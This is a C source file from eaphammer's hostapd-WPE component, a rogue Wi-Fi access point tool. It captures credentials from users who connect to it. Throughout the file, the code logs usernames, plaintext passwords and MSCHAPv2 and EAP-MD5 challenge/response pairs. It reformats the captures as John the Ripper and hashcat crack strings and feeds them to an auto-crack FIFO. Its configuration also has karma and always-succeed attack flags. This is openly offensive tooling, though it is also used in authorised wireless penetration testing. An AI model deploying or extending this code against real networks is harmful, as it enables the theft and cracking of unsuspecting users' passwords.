/*
    wpe.c - 
        brad.antoniewicz@foundstone.com
        Implements WPE (Wireless Pwnage Edition) functionality within 
        hostapd.

        WPE functionality focuses on targeting connecting users. At 
        it's core it implements credential logging (originally 
        implemented in FreeRADIUS-WPE), but also includes other patches
        for other client attacks that have been modified to some extend.

            FreeRADIUS-WPE: https://github.com/brad-anton/freeradius-wpe
*/

#include <time.h>
#include <openssl/ssl.h>
#include "includes.h"
#include "common.h"
#include "eaphammer_wpe/eaphammer_wpe.h"
#include "utils/wpa_debug.h"
#include "ap/eh_ssid_table_t.h"

#define logfile_default_location "./hostapd-wpe.log"
#define autocrack_fifo_default_location "./eaphammer-fifo.node" // eaphammer


#define MSCHAPV2_CHAL_HASH_LEN 8
#define MSCHAPV2_CHAL_LEN 16 
#define MSCHAPV2_RESP_LEN 24

struct eaphammer_global_config eaphammer_global_conf = {
    .logfile = logfile_default_location,
    .logfile_fp = NULL,
	.autocrack_fifo = autocrack_fifo_default_location, // eaphammer
	.autocrack_fifo_fp = NULL, // eaphammer
	.use_autocrack = 0, // eaphammer
    .always_return_success = 0,
	.use_karma = 0,
	.use_ssid_acl = 0,
	.ssid_acl_mode = 0,
	.known_beacons = 0,
	.singed_pants = 0,
	.ssid_table = NULL,
	.sta_table = NULL,
};

void wpe_log_file_and_stdout(char const *fmt, ...) {

    if ( eaphammer_global_conf.logfile_fp == NULL ) {
        eaphammer_global_conf.logfile_fp = fopen(eaphammer_global_conf.logfile, "a");
        if ( eaphammer_global_conf.logfile_fp == NULL ) 
            printf("WPE: Cannot file log file");
    }

    va_list ap;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);

    va_start(ap, fmt);
    if ( eaphammer_global_conf.logfile_fp != NULL )
        vfprintf(eaphammer_global_conf.logfile_fp, fmt, ap);
    va_end(ap);
}

// begin eaphammer fifo
void eaphammer_write_fifo(const u8 *username,
						size_t username_len,
						const u8 *challenge,
						size_t challenge_len,
						const u8 *response,
						size_t response_len) {

	int i;

	//mkfifo(eaphammer_global_conf.autocrack_fifo, 0666);
	eaphammer_global_conf.autocrack_fifo_fp = fopen(eaphammer_global_conf.autocrack_fifo, "a");

	// write username to fifo
	if ( eaphammer_global_conf.autocrack_fifo_fp != NULL ) {
		for(i = 0; i < username_len - 1; ++i) {
			fprintf(eaphammer_global_conf.autocrack_fifo_fp, "%c", username[i]);
		}
		fprintf(eaphammer_global_conf.autocrack_fifo_fp, "%c|", username[i]);
	}

	// write challenge to fifo
	if ( eaphammer_global_conf.autocrack_fifo_fp != NULL ) {
		for(i = 0; i < challenge_len - 1; ++i) {
			fprintf(eaphammer_global_conf.autocrack_fifo_fp, "%02x:", challenge[i]);
		}
		fprintf(eaphammer_global_conf.autocrack_fifo_fp, "%02x|", challenge[i]);
	}

	// write response to fifo
	if ( eaphammer_global_conf.autocrack_fifo_fp != NULL ) {
		for(i = 0; i < response_len - 1; ++i) {
			fprintf(eaphammer_global_conf.autocrack_fifo_fp, "%02x:", response[i]);
		}
		fprintf(eaphammer_global_conf.autocrack_fifo_fp, "%02x\n", response[i]);
	}
	
	fclose(eaphammer_global_conf.autocrack_fifo_fp);
}
// end eaphammer fifo

void wpe_log_chalresp(char *type, const u8 *full_username, size_t full_username_len, const u8 *username, size_t username_len, const u8 *challenge, size_t challenge_len, const u8 *response, size_t response_len, const u8 eap_id) {
    time_t nowtime;
    int x; 

    nowtime = time(NULL);

    wpe_log_file_and_stdout("\n\n%s: %s", type, ctime(&nowtime));
    wpe_log_file_and_stdout("\t domain\\username:\t\t");
    for (x=0; x<full_username_len; x++) {
        wpe_log_file_and_stdout("%c",full_username[x]);
	}
    wpe_log_file_and_stdout("\n");
    wpe_log_file_and_stdout("\t username:\t\t\t");
    for (x=0; x<username_len; x++) {
        wpe_log_file_and_stdout("%c",username[x]);
	}
    wpe_log_file_and_stdout("\n");

    wpe_log_file_and_stdout("\t challenge:\t\t\t");
    for (x=0; x<challenge_len - 1; x++) {
        wpe_log_file_and_stdout("%02x:",challenge[x]);
	}
    wpe_log_file_and_stdout("%02x\n",challenge[x]);

    wpe_log_file_and_stdout("\t response:\t\t\t");
    for (x=0; x<response_len - 1; x++) {
        wpe_log_file_and_stdout("%02x:",response[x]);
	}
    wpe_log_file_and_stdout("%02x\n\n",response[x]);

	// begin eaphammer
	if ( eaphammer_global_conf.use_autocrack != 0 ) {

		eaphammer_write_fifo(username,
							username_len,
							challenge,
							challenge_len,
							response,
							response_len); 
	}
	// end eaphammer

	// start eaphammer eap-md5 logging 
    if (strncmp(type, "eap-md5", 7) == 0) {
    	wpe_log_file_and_stdout("\t eap_id:\t\t\t");
		wpe_log_file_and_stdout("%d\n\n", eap_id);	
	}

    if (strncmp(type, "eap-md5", 7) == 0) {

        wpe_log_file_and_stdout("\t jtr NETNTLM:\t\t\t");
        for (x = 0; x < username_len; x++) {

            wpe_log_file_and_stdout("%c",username[x]);
		}
        wpe_log_file_and_stdout(":$chap$");

        wpe_log_file_and_stdout("%d*", eap_id);

		// print response
		for(x = 0; x < response_len; x++) {

			wpe_log_file_and_stdout("%02x", response[x]);
		}
        wpe_log_file_and_stdout("*");

		// print challenge
        for (x = 0; x < challenge_len; x++) {

            wpe_log_file_and_stdout("%02x", challenge[x]);
		}
        wpe_log_file_and_stdout("\n\n\n");

        wpe_log_file_and_stdout("\t hashcat NETNTLM:\t\t");

		// print response
		for(x = 0; x < response_len; x++) {

			wpe_log_file_and_stdout("%02x", response[x]);
		}
        wpe_log_file_and_stdout(":");

		// print challenge
        for (x = 0; x < challenge_len; x++)
            wpe_log_file_and_stdout("%02x", challenge[x]);
        wpe_log_file_and_stdout(":");

		// print eap_id
        wpe_log_file_and_stdout("%02x", eap_id);
        wpe_log_file_and_stdout("\n\n\n");
	}
	// end eaphammer eap-md5 logging

    if (strncmp(type, "mschapv2", 8) == 0 || strncmp(type, "eap-ttls/mschapv2", 17) == 0) {
        wpe_log_file_and_stdout("\t jtr NETNTLM:\t\t\t");
        for (x=0; x<username_len; x++)
            wpe_log_file_and_stdout("%c",username[x]);
        wpe_log_file_and_stdout(":$NETNTLM$");

        for (x=0; x<challenge_len; x++)
            wpe_log_file_and_stdout("%02x",challenge[x]);
        wpe_log_file_and_stdout("$");
        for (x=0; x<response_len; x++)
            wpe_log_file_and_stdout("%02x",response[x]);
        wpe_log_file_and_stdout("\n\n");
    }

	// begin eaphammer
    if (strncmp(type, "mschapv2", 8) == 0 || strncmp(type, "eap-ttls/mschapv2", 17) == 0) {
        wpe_log_file_and_stdout("\t hashcat NETNTLM:\t\t");
        for (x=0; x<username_len; x++)
            wpe_log_file_and_stdout("%c",username[x]);
        wpe_log_file_and_stdout("::::");

        for (x=0; x<response_len; x++)
            wpe_log_file_and_stdout("%02x",response[x]);
        wpe_log_file_and_stdout(":");

        for (x=0; x<challenge_len; x++)
            wpe_log_file_and_stdout("%02x",challenge[x]);
        wpe_log_file_and_stdout("\n\n\n");
    }
	

	// end eaphammer
}

void wpe_log_basic(char *type, const u8 *username, size_t username_len, const u8 *password, size_t password_len)  {
    time_t nowtime;
    int x;

    nowtime = time(NULL);

    wpe_log_file_and_stdout("\n\n%s: %s",type, ctime(&nowtime));
    wpe_log_file_and_stdout("\t username:\t");
    for (x=0; x<username_len; x++)
        wpe_log_file_and_stdout("%c",username[x]);
    wpe_log_file_and_stdout("\n");

    wpe_log_file_and_stdout("\t password:\t");
    for (x=0; x<password_len; x++)
        wpe_log_file_and_stdout("%c",password[x]);
    wpe_log_file_and_stdout("\n");
}

/*
    Taken from asleap, who took from nmap, who took from tcpdump :) 
*/
void wpe_hexdump(unsigned char *bp, unsigned int length)
{

    /* stolen from tcpdump, then kludged extensively */

    static const char asciify[] =
        "................................ !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~.................................................................................................................................";

    const unsigned short *sp;
    const unsigned char *ap;
    unsigned int i, j;
    int nshorts, nshorts2;
    int padding;

    wpe_log_file_and_stdout("\n\t");
    padding = 0;
    sp = (unsigned short *)bp;
    ap = (unsigned char *)bp;
    nshorts = (unsigned int)length / sizeof(unsigned short);
    nshorts2 = (unsigned int)length / sizeof(unsigned short);
    i = 0;
    j = 0;
    while (1) {
        while (--nshorts >= 0) {
            wpe_log_file_and_stdout(" %04x", ntohs(*sp));
            sp++;
            if ((++i % 8) == 0)
                break;
        }
        if (nshorts < 0) {
            if ((length & 1) && (((i - 1) % 8) != 0)) {
                wpe_log_file_and_stdout(" %02x  ", *(unsigned char *)sp);
                padding++;
            }
            nshorts = (8 - (nshorts2 - nshorts));
            while (--nshorts >= 0) {
                wpe_log_file_and_stdout("     ");
            }
            if (!padding)
                wpe_log_file_and_stdout("     ");
        }
        wpe_log_file_and_stdout("  ");

        while (--nshorts2 >= 0) {
            wpe_log_file_and_stdout("%c%c", asciify[*ap], asciify[*(ap + 1)]);
            ap += 2;
            if ((++j % 8) == 0) {
                wpe_log_file_and_stdout("\n\t");
                break;
            }
        }
        if (nshorts2 < 0) {
            if ((length & 1) && (((j - 1) % 8) != 0)) {
                wpe_log_file_and_stdout("%c", asciify[*ap]);
            }
            break;
        }
    }
    if ((length & 1) && (((i - 1) % 8) == 0)) {
        wpe_log_file_and_stdout(" %02x", *(unsigned char *)sp);
        wpe_log_file_and_stdout("                                       %c",
               asciify[*ap]);
    }
    wpe_log_file_and_stdout("\n");
}
